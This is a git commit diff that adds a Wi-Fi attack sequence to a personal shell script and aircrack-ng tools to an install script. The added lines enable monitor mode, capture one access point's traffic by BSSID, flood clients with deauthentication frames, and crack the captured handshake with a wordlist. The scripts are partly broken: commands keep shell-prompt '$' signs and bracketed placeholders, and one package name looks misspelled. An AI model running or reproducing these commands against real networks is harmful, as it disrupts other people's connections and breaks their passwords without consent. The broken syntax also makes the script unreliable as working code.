e5effccf502c0dda1dc621874b5fbc2203208c00
frunesslayer <80543701+frunesslayer@users.noreply.github.com>
2024-03-09 20:57:09 +0100

    Add files via upload

--- attivazione_internet-finale.sh
+++ attivazione_internet-finale.sh
@@ -1,6 +1,28 @@
 #attivazione Driver usb-wireless
 ip link set dev wlxbcec43442351 down
 
+iwconfig
+
+iwlist wlxbcec43442351 channel
+
+iw dev wlxbcec43442351 set channel 40
+
+airmon-ng start wlxbcec43442351 40 
+
 ip link set dev wlxbcec43442351 up
 
 dhclient -v wlxbcec43442351
+
+$ ifconfig wlan0 down
+
+$ iwconfig wlan0 mode monitor
+
+$ ifconfig wlan0 up 
+
+airmon-ng check wlan0
+
+airodump-ng wlan0
+$ airodump-ng -c [channel number] -w [filename for output] --bssid [MAC Address of A.P.] [your interface]
+$ airodump-ng -c 7 -w SCAN_OUTPUT --bssid 7C:B1:DF:B9:12:59 wlan0
+$ aireplay-ng -0 0 -a 7C:B1:DF:B9:12:59 wlan0
+$ aircrack-ng -w wordlist.txt SCAN_OUTPUT.cap
--- installazione_pacchetti.sh
+++ installazione_pacchetti.sh
@@ -2,7 +2,7 @@
 apt update -y && apt upgrade -y
 
 #installazione aircrack-ng wifi
-apt install -y aircrack-ng airmon-ng aireplay-ng packetforce-ng 
+apt install -y aircrack-ng airmon-ng aireplay-ng packetforce-ng net-tools
 
 
 #installazione 
